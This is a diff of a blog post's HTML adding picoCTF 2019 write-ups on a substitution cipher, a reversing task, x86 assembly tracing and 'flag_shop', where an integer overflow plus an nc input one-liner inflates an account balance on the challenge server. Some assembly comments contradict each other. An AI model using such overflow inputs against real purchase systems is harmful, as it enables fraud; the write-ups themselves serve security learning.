@@ -1023,10 +1023,11 @@ But to make code more readable, I use the Firefox console to translate some of t
 <pre><code>What does asm2(0xb,0x2e) return?
 </code></pre>
 <p>This is how the stack looks like after the prolog:</p>
-<p>| 0x2e      | &lt;&ndash; ebp+0xc (ebp+12)
-| 0xb       | &lt;&ndash; ebp+8
-| ret       | &lt;&ndash; ebp+4
-| old ebp   | &lt;&ndash; new ebp</p>
+<pre><code>| 0x2e      | &lt;-- ebp+0xc (ebp+12)
+| 0xb       | &lt;-- ebp+8
+| ret       | &lt;-- ebp+4
+| old ebp   | &lt;-- new ebp
+</code></pre>
 <div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
 <table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
 <pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
@@ -1756,7 +1757,442 @@ for i in ascii.strip().split('\n'):
     flag += chr(int(i))
 
 print(&quot;picoCTF{%s}&quot; % flag)
-</code></pre>]]></content>
+</code></pre><h2 id="waves-over-lambda">Waves over Lambda</h2>
+<p>This is a substitution cipher which reminds me an old challenge called <a href="https://0xade1.github.io/devdraft/posts/2019/12/picoctf-2018-cryptography/#hertz">picoCTF2018 - Hertz</a> . I can simply reuse the exact same code:</p>
+<pre><code>nc jupiter.challenges.picoctf.org 39894 | tee hertz.txt
+-------------------------------------------------------------------------------
+xealtywj crtr pj geqt iuyl - itrbqraxg_pj_x_evrt_uydksy_yliuxlwgqr
+-------------------------------------------------------------------------------
+yurfrg igesetevpwxc nytydyzev hyj wcr wcpts jea ei igeset myvuevpwxc nytydyzev, y uyas ehart hruu naeha pa eqt spjwtpxw pa cpj eha syg, yas jwpuu trdrdkrtrs ydeal qj ehpal we cpj lueedg yas wtylpx srywc, hcpxc cymmrars wcptwrra grytj yle, yas hcpxc p jcyuu srjxtpkr pa pwj mtemrt muyxr. iet wcr mtrjraw p hpuu eaug jyg wcyw wcpj uyasehartiet je hr qjrs we xyuu cpd, yuwceqlc cr cytsug jmraw y syg ei cpj upir ea cpj eha rjwywrhyj y jwtyalr wgmr, grw ear mtrwwg itrbqrawug we kr drw hpwc, y wgmr ykorxw yas vpxpeqj yas yw
+</code></pre>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 break_substitution_cipher.py
+Substitution Cipher solver, you may have to <span style="color:#8be9fd;font-style:italic">wait</span> several iterations
+<span style="color:#ff79c6">for</span> the correct result. Press ctrl+c to <span style="color:#8be9fd;font-style:italic">exit</span> program.
+
+best score so far: -4389.788611254096 on iteration <span style="color:#bd93f9">1</span>
+best key: YKXSRILCPONUDAEMBTJWQVHFGZ
+plaintext: CONGRATSHEREISYOURFLAGFREQUENCYISCOVERLAMBDAAGFLCGTYUEALEXEYFYODOROVITCHKARAMAZOVWASTHETHIRDSONOFFYODORPAVLOVITCHKARAMAZOVALANDOWNERWELLKNOWNINOURDISTRICTINHISOWNDAYANDSTILLREMEMBEREDAMONGUSOWINGTOHISGLOOMYANDTRAGICDEATHWHICHHAPPENEDTHIRTEENYEARSAGOANDWHICHISHALLDESCRIBEINITSPROPERPLACEFORTHEPRESENTIWILLONLYSAYTHATTHISLANDOWNERFORSOWEUSEDTOCALLHIMALTHOUGHHEHARDLYSPENTADAYOFHISLIFEONHISOWNESTATEWASASTRANGETYPEYETONEPRETTYFREQUENTLYTOBEMETWITHATYPEABJECTANDVICIOUSANDATTHESAMETIMESENSELESSBUTHEWASONEOFTHOSESENSELESSPERSONSWHOAREVERYWELLCAPABLEOFLOOKINGAFTERTHEIRWORLDLYAFFAIRSANDAPPARENTLYAFTERNOTHINGELSEFYODORPAVLOVITCHFORINSTANCEBEGANWITHNEXTTONOTHINGHISESTATEWASOFTHESMALLESTHERANTODINEATOTHERMENSTABLESANDFASTENEDONTHEMASATOADYYETATHISDEATHITAPPEAREDTHATHEHADAHUNDREDTHOUSANDROUBLESINHARDCASHATTHESAMETIMEHEWASALLHISLIFEONEOFTHEMOSTSENSELESSFANTASTICALFELLOWSINTHEWHOLEDISTRICTIREPEATITWASNOTSTUPIDITYTHEMAJORITYOFTHESEFANTASTICALFELLOWSARESHREWDANDINTELLIGENTENOUGHBUTJUSTSENSELESSNESSANDAPECULIARNATIONALFORMOFIT
+</code></pre></td></tr></table>
+</div>
+</div><p>Now that it found the substitution key, I can use this python2 script:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python2" data-lang="python2"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#ff79c6">import</span> string
+
+alphabet <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span><span style="color:#ff79c6">.</span>lower()
+best_key <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;YKXSRILCPONUDAEMBTJWQVHFGZ&#39;</span><span style="color:#ff79c6">.</span>lower()
+
+<span style="color:#8be9fd;font-style:italic">file</span> <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">open</span>(<span style="color:#f1fa8c">&#34;hertz.txt&#34;</span>, <span style="color:#f1fa8c">&#34;r&#34;</span>)
+ctext <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">file</span><span style="color:#ff79c6">.</span>read()
+
+cleartext <span style="color:#ff79c6">=</span> ctext<span style="color:#ff79c6">.</span>translate(string<span style="color:#ff79c6">.</span>maketrans(best_key, alphabet))
+
+<span style="color:#ff79c6">print</span> (cleartext)
+</code></pre></td></tr></table>
+</div>
+</div><p>output:</p>
+<pre><code>-------------------------------------------------------------------------------
+congrats here is your flag - frequency_is_c_over_lambda_agflcgtyue
+-------------------------------------------------------------------------------
+alexey fyodorovitch karamazov was the third son of fyodor pavlovitch karamazov, a land owner well known in our district in his own day, and still remembered among us owing to his gloomy and tragic death, which happened thirteen years ago, and which i shall describe in its proper place. for the present i will only say that this landownerfor so we used to call him, although he hardly spent a day of his life on his own estatewas a strange type, yet one pretty frequently to be met with, a type abject and vicious and at the same time senseless. but he was one of those senseless persons who are very well capable of looking after their worldly affairs, and, apparently, after nothing else. fyodor pavlovitch, for instance, began with next to nothing; his estate was of the smallest; he ran to dine at other men's tables, and fastened on them as a toady, yet at his death it appeared that he had a hundred thousand roubles in hard cash. at the same time, he was all his life one of the most senseless, fantastical fellows in the whole district. i repeat, it was not stupiditythe majority of these fantastical fellows are shrewd and intelligent enoughbut just senselessness, and a peculiar national form of it.
+</code></pre>
+<h2 id="flag_shop">flag_shop</h2>
+<p>The <a href="https://stackoverflow.com/questions/12762040/get-the-maximum-value-of-a-variable-in-c#12762101">maximum size of a signed Integer in C</a> language is <code>2147483647</code>.
+Any value above this maximum value will result in the integer turning negative.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">total_cost <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">900</span><span style="color:#ff79c6">*</span>number_flags;
+</code></pre></td></tr></table>
+</div>
+</div><p>Looking at the above portion of the source code, it is vulnerable to <strong>Integer Overflow</strong> because I have control on the number_flags value.
+Therefore, if I put any value above 2147483647 // 900 = 2386092, the total_cost becomes a negative value.</p>
+<p>The total_cost being negative, it will always pass the condition of being below our account balance.
+What is more fun, is that when deducting the total_cost from my account_balance, because it is negative, my account_balance will actually increase ;P</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">    <span style="color:#ff79c6">if</span>(total_cost <span style="color:#ff79c6">&lt;=</span> account_balance){
+        account_balance <span style="color:#ff79c6">=</span> account_balance <span style="color:#ff79c6">-</span> total_cost;
+</code></pre></td></tr></table>
+</div>
+</div><p>solution:</p>
+<pre><code>(echo 2; echo 1; echo 2386100; echo 2; echo 2; echo 1; echo 3) | nc jupiter.challenges.picoctf.org 9745 | grep picoCTF
+</code></pre>
+<h2 id="investigative-reversing-0">Investigative Reversing 0</h2>
+<p>We are being provided an ELF64 binary called <code>mystery</code> and a PNG image called <code>mystery.png</code></p>
+<p>Simple check of the PNG reveals something wrong about it. There is something after the end of the image:</p>
+<pre><code>pngcheck mystery.png
+mystery.png  additional data after IEND chunk
+ERROR: mystery.png
+</code></pre>
+<p>Using xxd or strings, we find something that the culprit looks like a corrupted flag: <code>picoCTK.k5zsid6q_3d659f57}</code></p>
+<pre><code>xxd mystery.png | tail -4
+0001e850: 8220 0882 2008 8220 6417 ffef fffd 7f5e  . .. .. d......^
+0001e860: ed5a 9d38 d01f 5600 0000 0049 454e 44ae  .Z.8..V....IEND.
+0001e870: 4260 8270 6963 6f43 544b 806b 357a 7369  B`.picoCTK.k5zsi
+0001e880: 6436 715f 3364 3635 3966 3537 7d         d6q_3d659f57}
+</code></pre>
+<p>Because it does not looks like a flag, I can use radare2 to reverse engineer the binary:</p>
+<pre><code>radare2 mystery
+aaaa
+afl
+s main
+pdf main
+</code></pre>
+<p>At the very beginning of the binary, we observe that the binary needs both the PNG and a <strong>flag.txt</strong> file.
+My intuition is that the binary is used to store or retrieve the content of flag.txt into/from the PNG.</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm">|           0<span style="color:#50fa7b">x000011b3</span>      <span style="color:#bd93f9">488</span>d3d500e00.  lea rdi, str.flag.txt       <span style="color:#6272a4">; 0x200a ; &#34;flag.txt&#34;
+</span><span style="color:#6272a4"></span>|           <span style="color:#bd93f9">0x000011ba</span>      e8c1feffff     call sym.imp.fopen
+|           0<span style="color:#50fa7b">x000011bf</span>      <span style="color:#bd93f9">488945</span>c0       mov qword [var_40h], rax
+|           0<span style="color:#50fa7b">x000011c3</span>      <span style="color:#bd93f9">488</span>d35490e00.  lea rsi, [<span style="color:#bd93f9">0x00002013</span>]       <span style="color:#6272a4">; &#34;a&#34;
+</span><span style="color:#6272a4"></span>|           <span style="color:#bd93f9">0x000011ca</span>      <span style="color:#bd93f9">488</span>d3d440e00.  lea rdi, str.mystery.png    <span style="color:#6272a4">; 0x2015 ; &#34;mystery.png&#34;
+</span></code></pre></td></tr></table>
+</div>
+</div><p>Instead of reverse engineering the code, let&rsquo;s play and manipulate the binary inputs by
+creating a false flag.txt of same size with value: <code>picoCTF{aaaaaaaa_aaaaaaaa}</code></p>
+<p>After we run the <code>./mystery</code> program, then examine the end of the PNG. We see: <code>picoCTK.fffffff^_aaaaaaaa}</code></p>
+<p>So we can infer a transformation table:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>false flag.txt</td>
+<td>picoCT</td>
+<td>F{</td>
+<td>aaaaaaa</td>
+<td>a</td>
+<td>_aaaaaaaa}</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>picoCT</td>
+<td>K.</td>
+<td>fffffff</td>
+<td>^</td>
+<td>_aaaaaaaa}</td>
+</tr>
+<tr>
+<td>transformation</td>
+<td>identical</td>
+<td>XX</td>
+<td>ord(&lsquo;f&rsquo;) - ord(&lsquo;a&rsquo;) = +5</td>
+<td>ord('^')-ord(&lsquo;a&rsquo;) = -3</td>
+<td>identical</td>
+</tr>
+</tbody>
+</table>
+<p>With the above transformation rule in mind, we can infer the real flag:</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>reverse transformation</td>
+<td>identical</td>
+<td>XX</td>
+<td>-5</td>
+<td>+3</td>
+<td>identical</td>
+</tr>
+<tr>
+<td>PNG</td>
+<td>picoCT</td>
+<td>K.</td>
+<td>k5zsid6</td>
+<td>q</td>
+<td>_3d659f57}</td>
+</tr>
+<tr>
+<td>real flag.txt</td>
+<td>picoCT</td>
+<td>F{</td>
+<td>f0und_1</td>
+<td>t</td>
+<td>_3d659f57}</td>
+</tr>
+</tbody>
+</table>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f1fa8c">&#39;&#39;</span><span style="color:#ff79c6">.</span>join([<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(c)<span style="color:#ff79c6">-</span><span style="color:#bd93f9">5</span>) <span style="color:#ff79c6">for</span> c <span style="color:#ff79c6">in</span> <span style="color:#f1fa8c">&#34;k5zsid6&#34;</span>])     <span style="color:#6272a4"># &#39;f0und_1</span>
+<span style="color:#8be9fd;font-style:italic">chr</span>(<span style="color:#8be9fd;font-style:italic">ord</span>(<span style="color:#f1fa8c">&#39;q&#39;</span>)<span style="color:#ff79c6">+</span><span style="color:#bd93f9">3</span>)                                 <span style="color:#6272a4"># &#39;t&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><h2 id="asm3">asm3</h2>
+<blockquote>
+<p>What does asm3(0xba6c5a02,0xd101e3dd,0xbb86a173) return</p>
+</blockquote>
+<p>After the prolog, the stack looks like this:</p>
+<pre><code>| arg3      | &lt;-- ebp+0x10 = 0xbb86a173
+| arg2      | &lt;-- ebp+0xc  = 0xd101e3dd
+| arg1      | &lt;-- ebp+8    = 0xba6c5a02
+| ret       |
+| old ebp   | &lt;--new ebp
+</code></pre>
+<h3 id="internals">Internals</h3>
+<p>Lets represent a table with offset relatively to ebp:</p>
+<pre><code>&lt;--most significant/least significant-&gt;
+offset |    | x12 |    |    |    |    | xd | xc | xb |    |    | x8 |
+Bytes  | bb | 86  | a1 | 73 | d1 | 01 | e3 | dd | ba | 6c | 5a | 02 |
+</code></pre>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#8be9fd;font-style:italic">asm3:</span>
+        &lt;+0&gt;:   <span style="color:#50fa7b">push</span>   ebp      <span style="color:#6272a4">; prolog ;
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">1</span>&gt;:   mov    ebp,esp  <span style="color:#6272a4">; prolog ;
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">3</span>&gt;:   xor    eax,eax                  <span style="color:#6272a4">; eax =0
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">5</span>&gt;:   mov    ah,BYTE PTR [ebp+<span style="color:#bd93f9">0xb</span>]    <span style="color:#6272a4">; ah = xba
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">8</span>&gt;:   shl    ax,<span style="color:#bd93f9">0x10</span>                  <span style="color:#6272a4">; ax = ax &lt;&lt; 16
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">12</span>&gt;:  sub    al,BYTE PTR [ebp+<span style="color:#bd93f9">0xd</span>]    <span style="color:#6272a4">; al -= xe3
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">15</span>&gt;:  add    ah,BYTE PTR [ebp+<span style="color:#bd93f9">0xc</span>]    <span style="color:#6272a4">; ah += xdd
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">18</span>&gt;:  xor    ax,WORD PTR [ebp+<span style="color:#bd93f9">0x12</span>]   <span style="color:#6272a4">; ax = ax ^ xbb86
+</span><span style="color:#6272a4"></span>        &lt;+<span style="color:#bd93f9">22</span>&gt;:  nop
+        &lt;+23&gt;:  <span style="color:#50fa7b">pop</span>    ebp
+        &lt;+24&gt;:  <span style="color:#50fa7b">ret</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>Now let&rsquo;s examine the 32 bits EAX register at each step:</p>
+<pre><code>&lt;--most significant/least significant-&gt;
+|   operation    |       |    AX   |
+|                |       | AH | AL |
++----------------+-------+----+----+
+|  eax=0         | 00 00 | 00 | 00 |
+|  ah=xba        | 00 00 | ba | 00 |
+|  ax=ax&lt;&lt;16     | 00 00 | 00 | 00 |
+|  al-=0xe3      | 00 00 | 00 | 1d | (2's Complement)
+|  ah+=xdd       | 00 00 | dd | 1d |
+|  ax=ax^x86a1   | 00 00 | 66 | 9b | hex(0xdd1d ^ 0xbb86) = 0x669b
+</code></pre>
+<p>x86 utilizes <a href="https://www.tutorialspoint.com/two-s-complement"><strong>2&rsquo;s Complement</strong></a> to represent negative numbers.
+To calculate the 2&rsquo;s Complement given a certain binary:</p>
+<ol>
+<li>invert all the bits to obtain the 1&rsquo;s Complement</li>
+<li>add +1 to obtain the 2&rsquo;s Complement</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>hex</th>
+<th>dec</th>
+<th>binary</th>
+<th>1&rsquo;s complement</th>
+<th>2&rsquo;s complement</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>0xe3</td>
+<td>227</td>
+<td>1110 0011</td>
+<td>0001 1100 (0x1c)</td>
+<td>0001 1101 (0x1d)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="radare2-way">Radare2 way</h3>
+<p>Rewrite the code so that you can compile it:</p>
+<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
+<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
+</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-asm" data-lang="asm"><span style="color:#6272a4">;intel_syntax noprefix
+</span><span style="color:#6272a4">;bits 32
+</span><span style="color:#6272a4"></span>
+<span style="color:#50fa7b">SECTION</span> .data
+
+<span style="color:#50fa7b">SECTION</span> .text
+<span style="color:#50fa7b">global</span>  _start
+
+<span style="color:#8be9fd;font-style:italic">_start:</span>
+	<span style="color:#50fa7b">push</span> <span style="color:#bd93f9">0xbb86a173</span>		<span style="color:#6272a4">; push arg3
+</span><span style="color:#6272a4"></span>	push <span style="color:#bd93f9">0xd101e3dd</span>		<span style="color:#6272a4">; push arg2
+</span><span style="color:#6272a4"></span>	push <span style="color:#bd93f9">0xba6c5a02</span>		<span style="color:#6272a4">; push arg1
+</span><span style="color:#6272a4"></span>	call asm3
+
+<span style="color:#8be9fd;font-style:italic">asm3:</span>
+        <span style="color:#50fa7b">push</span>   ebp      <span style="color:#6272a4">; prolog ;
+</span><span style="color:#6272a4"></span>        mov    ebp,esp  <span style="color:#6272a4">; prolog ;
+</span><span style="color:#6272a4"></span>        xor    eax,eax                  <span style="color:#6272a4">; eax =0
+</span><span style="color:#6272a4"></span>        mov    ah,BYTE [ebp+<span style="color:#bd93f9">0xb</span>]    <span style="color:#6272a4">; ah = x02
+</span><span style="color:#6272a4"></span>        shl    ax,<span style="color:#bd93f9">0x10</span>                  <span style="color:#6272a4">; ax = ax &lt;&lt; 16
+</span><span style="color:#6272a4"></span>        sub    al,BYTE [ebp+<span style="color:#bd93f9">0xd</span>]    <span style="color:#6272a4">; al -= x01
+</span><span style="color:#6272a4"></span>        add    ah,BYTE [ebp+<span style="color:#bd93f9">0xc</span>]    <span style="color:#6272a4">; ah += xd1
+</span><span style="color:#6272a4"></span>        xor    ax,WORD [ebp+<span style="color:#bd93f9">0x12</span>]   <span style="color:#6272a4">; ax = ax ^ xa173
+</span><span style="color:#6272a4"></span>        nop
+        <span style="color:#50fa7b">pop</span>    ebp
